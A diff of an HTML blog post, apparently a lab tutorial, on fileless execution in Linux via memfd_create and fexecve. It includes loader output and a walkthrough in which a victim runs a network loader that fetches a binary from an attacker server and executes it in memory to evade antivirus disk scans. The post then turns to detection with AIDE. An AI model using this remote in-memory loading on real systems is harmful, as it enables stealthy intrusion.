class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">wmv</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">asf</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">rm</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">rmvb</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">flc</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">avi</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">fli</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">flv</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">gl</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">dl</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">xcf</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">xwd</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">yuv</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">cgm</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">emf</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">ogv</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">ogx</span><span class="o">=</span><span class="mi">01</span><span class="p">;</span><span class="mi">35</span><span class="p">:</span><span class="o">*.</span><span class="n">aac</span><span class="o">=</span><span class="mi">00</span><span class="p">;</span><span class="mi">36</span><span class="p">:</span><span class="o">*.</span><span class="n">au</span><span class="o">=</span><span class="mi">00</span><span class="p">;</span><span class="mi">36</span><span class="p">:</span><span class="o">*.</span><span class="n">flac</span><span class="o">=</span><span class="mi">00</span><span class="p">;</span><span class="mi">36</span><span class="p">:</span><span class="o">*.</span><span class="n">m4a</span><span class="o">=</span><span class="mi">00</span><span class="p">;</span><span class="mi">36</span><span class="p">:</span><span class="o">*.</span><span class="n">mid</span><span class="o">=</span><span class="mi">00</span><span class="p">;</span><span class="mi">36</span><span class="p">:</span><span class="o">*.</span><span class="n">midi</span><span class="o">=</span><span class="mi">00</span><span class="p">;</span><span class="mi">36</span><span class="p">:</span><span class="o">*.</span><span class="n">mka</span><span class="o">=</span><span class="mi">00</span><span class="p">;</span><span class="mi">36</span><span class="p">:</span><span class="o">*.</span><span class="n">mp3</span><span class="o">=</span><span class="mi">00</span><span class="p">;</span><span class="mi">36</span><span class="p">:</span><span class="o">*.</span><span class="n">mpc</span><span class="o">=</span><span class="mi">00</span><span class="p">;</span><span class="mi">36</span><span class="p">:</span><span class="o">*.</span><span class="n">ogg</span><span class="o">=</span><span class="mi">00</span><span class="p">;</span><span class="mi">36</span><span class="p">:</span><span class="o">*.</span><span class="n">ra</span><span class="o">=</span><span class="mi">00</span><span class="p">;</span><span class="mi">36</span><span class="p">:</span><span class="o">*.</span><span class="n">wav</span><span class="o">=</span><span class="mi">00</span><span class="p">;</span><span class="mi">36</span><span class="p">:</span><span class="o">*.</span><span class="n">oga</span><span class="o">=</span><span class="mi">00</span><span class="p">;</span><span class="mi">36</span><span class="p">:</span><span class="o">*.</span><span class="n">opus</span><span class="o">=</span><span class="mi">00</span><span class="p">;</span><span class="mi">36</span><span class="p">:</span><span class="o">*.</span><span class="n">spx</span><span class="o">=</span><span class="mi">00</span><span class="p">;</span><span class="mi">36</span><span class="p">:</span><span class="o">*.</span><span class="n">xspf</span><span class="o">=</span><span class="mi">00</span><span class="p">;</span><span class="mi">36</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93dc4</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">SSH_CONNECTION</span><span class="o">=</span><span class="mf">10.0</span><span class="o">.</span><span class="mf">2.2</span> <span class="mi">34954</span> <span class="mf">10.0</span><span class="o">.</span><span class="mf">2.15</span> <span class="mi">22</span>
+</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93def</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">LESSCLOSE</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">lesspipe</span> <span class="o">%</span><span class="n">s</span> <span class="o">%</span><span class="n">s</span>
+</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93e11</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">XDG_SESSION_CLASS</span><span class="o">=</span><span class="n">user</span>
+</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93e28</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">TERM</span><span class="o">=</span><span class="n">tmux</span><span class="o">-</span><span class="mi">256</span><span class="n">color</span>
+</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93e3b</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">LESSOPEN</span><span class="o">=|</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">lesspipe</span> <span class="o">%</span><span class="n">s</span>
+</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93e5b</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">USER</span><span class="o">=</span><span class="n">vagrant</span>
+</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">15</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93e68</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">SHLVL</span><span class="o">=</span><span class="mi">1</span>
+</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93e70</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">XDG_SESSION_ID</span><span class="o">=</span><span class="mi">6</span>
+</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">17</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93e81</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">XDG_RUNTIME_DIR</span><span class="o">=/</span><span class="n">run</span><span class="o">/</span><span class="n">user</span><span class="o">/</span><span class="mi">1000</span>
+</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">18</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93ea0</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">SSH_CLIENT</span><span class="o">=</span><span class="mf">10.0</span><span class="o">.</span><span class="mf">2.2</span> <span class="mi">34954</span> <span class="mi">22</span>
+</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">19</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93ebd</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">XDG_DATA_DIRS</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">share</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">snapd</span><span class="o">/</span><span class="n">desktop</span>
+</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">20</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93efe</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">PATH</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">games</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">games</span><span class="p">:</span><span class="o">/</span><span class="n">snap</span><span class="o">/</span><span class="n">bin</span>
+</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">21</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93f66</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">DBUS_SESSION_BUS_ADDRESS</span><span class="o">=</span><span class="n">unix</span><span class="p">:</span><span class="n">path</span><span class="o">=/</span><span class="n">run</span><span class="o">/</span><span class="n">user</span><span class="o">/</span><span class="mi">1000</span><span class="o">/</span><span class="n">bus</span>
+</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">22</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93f9c</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">SSH_TTY</span><span class="o">=/</span><span class="n">dev</span><span class="o">/</span><span class="n">pts</span><span class="o">/</span><span class="mi">0</span>
+</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">23</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93faf</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">_</span><span class="o">=./</span><span class="n">not_hello_world</span><span class="o">.</span><span class="n">o</span>
+</span></span><span class="line"><span class="cl">	<span class="n">envp</span><span class="p">[</span><span class="mi">24</span><span class="p">]</span> <span class="o">=</span><span class="p">[</span> <span class="mh">0x7ffd3bd93fc5</span> <span class="p">]</span><span class="o">==&gt;</span> <span class="n">OLDPWD</span><span class="o">=/</span><span class="n">home</span><span class="o">/</span><span class="n">vagrant</span><span class="o">/</span><span class="n">workspace</span>
+</span></span></code></pre></div><p>This still does not gives us what is happening behind the scenes, but it tells us that each program has some dedicated memory space where it stores a copy of arguments and environment variables in <strong>continuous memory locations</strong>. To gather more information we can use the <a href="https://www.man7.org/linux/man-pages/man1/strace.1.html"><code>strace</code></a> utility to trace the system calls made by our program.</p>
 <p><strong>Command</strong>: <code>strace ./not_hello_world.o  myarg1 myarg2 myarg3  2&gt;strace_output.log  1&gt;program_output.log</code><br>
 <em>NOTE:-  2(stderr) redirected to strace_output.log file and 1(stdout) redirected to program_output.log file</em></p>
 <p>command : <code>cat strace_output.log</code></p>
@@ -1549,51 +1549,51 @@ Environment list :
 </span></span><span class="line"><span class="cl">exit_group<span class="o">(</span>0<span class="o">)</span>                           <span class="o">=</span> ?
 </span></span><span class="line"><span class="cl">+++ exited with <span class="m">0</span> +++
 </span></span></code></pre></div><p>At first it looks confusing and very difficult to understand, but is very simple and straight forward once you have understood the format of this output.</p>
-<pre tabindex="0"><code># Format of the strace output.
-
-syscall(arg1, arg2, arg3, ... )  = Return value
-</code></pre><p>Now if we look at line-1 of the <code>strace_output.log</code> file, with the newly gained insight. It is very clear that we are calling <code>execve</code> syscall and passing arguments to it.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># Format of the strace output.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">syscall(arg1, arg2, arg3, ... )  = Return value
+</span></span></code></pre></div><p>Now if we look at line-1 of the <code>strace_output.log</code> file, with the newly gained insight. It is very clear that we are calling <code>execve</code> syscall and passing arguments to it.</p>
 <p>According to <a href="https://www.man7.org/linux/man-pages/man2/execve.2.html"><code>man 2 execve</code></a> &ndash;&gt; <em><strong>execve()</strong> executes the program referred to by pathname. This causes the program that is currently being run by the calling process to be replaced with a new program, with newly initialized stack, heap, and (initialized and uninitialized) data segments.</em></p>
 <p>This concludes that the execve() syscall is actually responsible to load the executable ELF file into memory!!
 Interestingly, our binary reads (gathers) all the data to be printed from multiple locations and then print it at once at end with a single <code>write()</code> syscall. The return value for write() denotes the number of bytes the syscall wrote. This is the exact amount of chars that was supposed to be written out on stdout but we redirected it to a file. Now we can check if the byte counts are same or not.</p>
 <p>We can check if the byte counts in the file match the byte count returned by write() syscall, using &ndash;&gt; <code>wc -c program_output.log</code></p>
 <p>output:</p>
-<pre tabindex="0"><code>3244 program_output.log
-</code></pre><p>With this, we know how a normal program executes in Memory. Below diagram summarizes it for a quick recap.</p>
-<pre tabindex="0"><code>      C program
-         │
-         │
-         │  Compiles
-         │
-         ▼
-
-     ELF binary
-
-         │
-         │
-         │  execve
-         │
-         ▼
-
-   loaded in memory
-</code></pre><h3 id="idea-of-file-less">Idea of file-less?</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">3244 program_output.log
+</span></span></code></pre></div><p>With this, we know how a normal program executes in Memory. Below diagram summarizes it for a quick recap.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl">      <span class="n">C</span> <span class="n">program</span>
+</span></span><span class="line"><span class="cl">         <span class="err">│</span>
+</span></span><span class="line"><span class="cl">         <span class="err">│</span>
+</span></span><span class="line"><span class="cl">         <span class="err">│</span>  <span class="n">Compiles</span>
+</span></span><span class="line"><span class="cl">         <span class="err">│</span>
+</span></span><span class="line"><span class="cl">         <span class="err">▼</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">     <span class="n">ELF</span> <span class="n">binary</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">         <span class="err">│</span>
+</span></span><span class="line"><span class="cl">         <span class="err">│</span>
+</span></span><span class="line"><span class="cl">         <span class="err">│</span>  <span class="n">execve</span>
+</span></span><span class="line"><span class="cl">         <span class="err">│</span>
+</span></span><span class="line"><span class="cl">         <span class="err">▼</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="n">loaded</span> <span class="ow">in</span> <span class="n">memory</span>
+</span></span></code></pre></div><h3 id="idea-of-file-less">Idea of file-less?</h3>
 <p>In usual scenarios, we have a compiled malicious binary stored on the victim&rsquo;s machine, that&rsquo;s then executed somehow for the malicious purpose of the attacker. Here we have multiple simpler methods and tools to analyze the binary and know what it is going to do. Most of the times, our antivirus can scan system&rsquo;s harddisk and know if there is a malware or a not.</p>
 <p>And we all trust our anti-virus for that!! 😜</p>
 <p><img loading="lazy" src="https://media.giphy.com/media/scujCg6C3AaFq/giphy.gif" alt=""  />
 </p>
 <p>But what if an attacker somehow loaded the ELF file directly into the memory, without writing it to harddisk (not even a temp file). In linux, one of the way to do that is via <a href="https://man7.org/linux/man-pages/man2/memfd_create.2.html"><code>memfd_create()</code></a> syscall. This creates an &ldquo;<code>anonymous file</code>&rdquo; and returns a &ldquo;<code>file descriptor</code>&rdquo; to it.</p>
 <p>OK! This had me with the first line of the man page - <code>man 2 memfd_create</code>. But there is more to it.</p>
-<pre tabindex="0"><code>memfd_create() creates an anonymous file and returns a file
-descriptor that refers to it.  The file behaves like a regular
-file, and so can be modified, truncated, memory-mapped, and so
-on.  However, unlike a regular file, it lives in RAM and has a
-volatile backing storage.  Once all references to the file are
-dropped, it is automatically released.  Anonymous memory is used
-for all backing pages of the file.  Therefore, files created by
-memfd_create() have the same semantics as other anonymous memory
-allocations such as those allocated using mmap(2) with the
-MAP_ANONYMOUS flag.
-</code></pre><p>We can now create a file directly in RAM all we need is a way to execute it. We could have used same old execve for this but we don&rsquo;t have a file pathname to begin with. After looking through the variants of the exec family syscalls, I stumbled upon <code>fexecve()</code> -  execute program specified via file descriptor.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">memfd_create() creates an anonymous file and returns a file
+</span></span><span class="line"><span class="cl">descriptor that refers to it.  The file behaves like a regular
+</span></span><span class="line"><span class="cl">file, and so can be modified, truncated, memory-mapped, and so
+</span></span><span class="line"><span class="cl">on.  However, unlike a regular file, it lives in RAM and has a
+</span></span><span class="line"><span class="cl">volatile backing storage.  Once all references to the file are
+</span></span><span class="line"><span class="cl">dropped, it is automatically released.  Anonymous memory is used
+</span></span><span class="line"><span class="cl">for all backing pages of the file.  Therefore, files created by
+</span></span><span class="line"><span class="cl">memfd_create() have the same semantics as other anonymous memory
+</span></span><span class="line"><span class="cl">allocations such as those allocated using mmap(2) with the
+</span></span><span class="line"><span class="cl">MAP_ANONYMOUS flag.
+</span></span></code></pre></div><p>We can now create a file directly in RAM all we need is a way to execute it. We could have used same old execve for this but we don&rsquo;t have a file pathname to begin with. After looking through the variants of the exec family syscalls, I stumbled upon <code>fexecve()</code> -  execute program specified via file descriptor.</p>
 <p>Now we have both,  a way to <code>create in memory files by memfd_create()</code> and <code>execute it with fexecve()</code>. We just need a program to glue everything together with a neat logic to make things work the way you want it.</p>
 <h3 id="first-fileless-program-in-c">First fileless program in C</h3>
 <p>I&rsquo;ve written a simple C program (<code>loader.c</code>) that creates an in-memory file and copies the data of a (local) binary to it. And then executes it. Simple, isn&rsquo;t it.</p>
@@ -1684,10 +1684,10 @@ MAP_ANONYMOUS flag.
 </span></span></code></pre></div><p>We should give some time to understand this code on <strong>why</strong> and <strong>how</strong> it&rsquo;ll load <strong>what</strong> in memory.</p>
 <p>We can compile this code to generate an ELF file with <code>gcc loader.c -o loader.o</code>; Once compiled, we can run it with <code>./loader.o</code></p>
 <p>Since there are no arguments(<code>argc&lt;2</code>), it should fail with usage information on stdout.</p>
-<pre tabindex="0"><code>USAGE: ./loader.o /path/to/binary arg_to_binary1 arg_to_binary2 ...
-</code></pre><p>Let&rsquo;s try again with some arguments this time.</p>
-<pre tabindex="0"><code>./loader.o /usr/bin/file loader.o
-</code></pre><p>This time things will not be same as last time. It&rsquo;ll :-</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">USAGE</span><span class="p">:</span> <span class="o">./</span><span class="n">loader</span><span class="o">.</span><span class="n">o</span> <span class="o">/</span><span class="n">path</span><span class="o">/</span><span class="n">to</span><span class="o">/</span><span class="n">binary</span> <span class="n">arg_to_binary1</span> <span class="n">arg_to_binary2</span> <span class="o">...</span>
+</span></span></code></pre></div><p>Let&rsquo;s try again with some arguments this time.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">./</span><span class="n">loader</span><span class="o">.</span><span class="n">o</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">file</span> <span class="n">loader</span><span class="o">.</span><span class="n">o</span>
+</span></span></code></pre></div><p>This time things will not be same as last time. It&rsquo;ll :-</p>
 <ol>
 <li>Creates an in-memory file and gets a file descriptor back (<code>fd1</code>).</li>
 <li>Opens local binary file (argv[1] = <code>/usr/bin/file</code>); Stores this file descriptor in <code>fd2</code>.</li>
@@ -1696,16 +1696,16 @@ MAP_ANONYMOUS flag.
 <li>Execute <code>fd1</code> &ndash;&gt; in-memory file.</li>
 </ol>
 <p>Output:</p>
-<pre tabindex="0"><code>[ * ] Trying to create a mem file...
-[ + ] Created mem file and attached to fd = 3
-[ * ] Reading /usr/bin/file file
-
- -----------------------------------
-Read count =  27104  |  Write count = 27104
- -----------------------------------
-[ + ] Starting execution...
-loader.o: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=426a7743592788cd18c92a76f22ccfb632700d7b, for GNU/Linux 3.2.0, with debug_info, not stripped
-</code></pre><p>Last line of the output is the proof that our in-memory file executed successfully&hellip; Now we can take it to next level.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="p">[</span> <span class="o">*</span> <span class="p">]</span> <span class="n">Trying</span> <span class="n">to</span> <span class="n">create</span> <span class="n">a</span> <span class="n">mem</span> <span class="n">file</span><span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span> <span class="o">+</span> <span class="p">]</span> <span class="n">Created</span> <span class="n">mem</span> <span class="n">file</span> <span class="ow">and</span> <span class="n">attached</span> <span class="n">to</span> <span class="n">fd</span> <span class="o">=</span> <span class="mi">3</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span> <span class="o">*</span> <span class="p">]</span> <span class="n">Reading</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">file</span> <span class="n">file</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="o">-----------------------------------</span>
+</span></span><span class="line"><span class="cl"><span class="n">Read</span> <span class="n">count</span> <span class="o">=</span>  <span class="mi">27104</span>  <span class="o">|</span>  <span class="n">Write</span> <span class="n">count</span> <span class="o">=</span> <span class="mi">27104</span>
+</span></span><span class="line"><span class="cl"> <span class="o">-----------------------------------</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span> <span class="o">+</span> <span class="p">]</span> <span class="n">Starting</span> <span class="n">execution</span><span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="n">loader</span><span class="o">.</span><span class="n">o</span><span class="p">:</span> <span class="n">ELF</span> <span class="mi">64</span><span class="o">-</span><span class="n">bit</span> <span class="n">LSB</span> <span class="n">shared</span> <span class="n">object</span><span class="p">,</span> <span class="n">x86</span><span class="o">-</span><span class="mi">64</span><span class="p">,</span> <span class="n">version</span> <span class="mi">1</span> <span class="p">(</span><span class="n">SYSV</span><span class="p">),</span> <span class="n">dynamically</span> <span class="n">linked</span><span class="p">,</span> <span class="n">interpreter</span> <span class="o">/</span><span class="n">lib64</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mf">64.</span><span class="n">so</span><span class="o">.</span><span class="mi">2</span><span class="p">,</span> <span class="n">BuildID</span><span class="p">[</span><span class="n">sha1</span><span class="p">]</span><span class="o">=</span><span class="mi">426</span><span class="n">a7743592788cd18c92a76f22ccfb632700d7b</span><span class="p">,</span> <span class="k">for</span> <span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span> <span class="mf">3.2</span><span class="o">.</span><span class="mi">0</span><span class="p">,</span> <span class="n">with</span> <span class="n">debug_info</span><span class="p">,</span> <span class="ow">not</span> <span class="n">stripped</span>
+</span></span></code></pre></div><p>Last line of the output is the proof that our in-memory file executed successfully&hellip; Now we can take it to next level.</p>
 <h3 id="loading-binary-from-network">loading binary from network</h3>
 <p>Till this point, we know how to write a basic code to load a local binary, create a in-mem file for it and then execute it.</p>
 <p>But an attacker won&rsquo;t just use it run the local binaries which can be executed directly, instead he would like to execute a binary sitting on his server and load that into victim&rsquo;s system directly in memory. This will not be detected with the help of any disk analysis tool or commands like <code>ls</code>. Also, this will be executing safe from &ldquo;Anti-Virus&rdquo; software complete disk-scan features.
@@ -1853,26 +1853,26 @@ In theory, attacker could run anything from his system on victim&rsquo;s system 
 <li>Politely ask the victim to execute the binary - <code>./network_loader.o 192.168.56.56 1234</code></li>
 <li>Sit back and enjoy!</li>
 </ol>
-<pre tabindex="0"><code>
-## On Attacker&#39;s machine
-$ python3 python_server.py
-
-16800
-&lt;socket.socket fd=4, family=AddressFamily.AF_INET, type=SocketKind.SOCK_STREAM, proto=0, laddr=(&#39;192.168.56.56&#39;, 1234), raddr=(&#39;192.168.56.56&#39;, 50812)&gt; (&#39;192.168.56.56&#39;, 50812)
-
-
-
-
-## on victim&#39;s machine
-$ ./network_loader.o 192.168.56.56 1234
-
-[ * ] Trying to create a mem file...  
-[ + ] Created mem file and attached to fd = 3
------------------------------------
-Read count =  16800  |  Write count = 16800
------------------------------------
-[ + ] Starting execution...
-</code></pre><p>And if we check the victim&rsquo;s working directory we can see a file with name <code>NOTICE_for_U.txt</code> there&hellip;. which confirms that the remote binary successfully ran on victim&rsquo;s machine.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## On Attacker&#39;s machine</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span> <span class="n">python3</span> <span class="n">python_server</span><span class="o">.</span><span class="n">py</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="mi">16800</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span> <span class="n">fd</span><span class="o">=</span><span class="mi">4</span><span class="p">,</span> <span class="n">family</span><span class="o">=</span><span class="n">AddressFamily</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">type</span><span class="o">=</span><span class="n">SocketKind</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="n">proto</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">laddr</span><span class="o">=</span><span class="p">(</span><span class="s1">&#39;192.168.56.56&#39;</span><span class="p">,</span> <span class="mi">1234</span><span class="p">),</span> <span class="n">raddr</span><span class="o">=</span><span class="p">(</span><span class="s1">&#39;192.168.56.56&#39;</span><span class="p">,</span> <span class="mi">50812</span><span class="p">)</span><span class="o">&gt;</span> <span class="p">(</span><span class="s1">&#39;192.168.56.56&#39;</span><span class="p">,</span> <span class="mi">50812</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## on victim&#39;s machine</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span> <span class="o">./</span><span class="n">network_loader</span><span class="o">.</span><span class="n">o</span> <span class="mf">192.168</span><span class="o">.</span><span class="mf">56.56</span> <span class="mi">1234</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[</span> <span class="o">*</span> <span class="p">]</span> <span class="n">Trying</span> <span class="n">to</span> <span class="n">create</span> <span class="n">a</span> <span class="n">mem</span> <span class="n">file</span><span class="o">...</span>  
+</span></span><span class="line"><span class="cl"><span class="p">[</span> <span class="o">+</span> <span class="p">]</span> <span class="n">Created</span> <span class="n">mem</span> <span class="n">file</span> <span class="ow">and</span> <span class="n">attached</span> <span class="n">to</span> <span class="n">fd</span> <span class="o">=</span> <span class="mi">3</span>
+</span></span><span class="line"><span class="cl"><span class="o">-----------------------------------</span>
+</span></span><span class="line"><span class="cl"><span class="n">Read</span> <span class="n">count</span> <span class="o">=</span>  <span class="mi">16800</span>  <span class="o">|</span>  <span class="n">Write</span> <span class="n">count</span> <span class="o">=</span> <span class="mi">16800</span>
+</span></span><span class="line"><span class="cl"><span class="o">-----------------------------------</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span> <span class="o">+</span> <span class="p">]</span> <span class="n">Starting</span> <span class="n">execution</span><span class="o">...</span>
+</span></span></code></pre></div><p>And if we check the victim&rsquo;s working directory we can see a file with name <code>NOTICE_for_U.txt</code> there&hellip;. which confirms that the remote binary successfully ran on victim&rsquo;s machine.</p>
 <p><img loading="lazy" src="https://media.giphy.com/media/LpLd2NGvpaiys/giphy.gif" alt=""  />
 </p>
 <hr>
@@ -1908,33 +1908,33 @@ Read count =  16800  |  Write count = 16800
 <p><em>But there are other HIDS tools that can do this for you. Like,</em> <a href="https://www.splunk.com/"><em>Splunk</em></a> <em>and</em> <a href="https://www.ossec.net/"><em>OSSEC</em></a><em>.</em></p>
 <p>AIDE have provided a <a href="https://aide.github.io/doc/">pretty simple documentation</a> to undertand and get familiar with it.</p>
 <h3 id="how-to-install-it">How to install it?</h3>
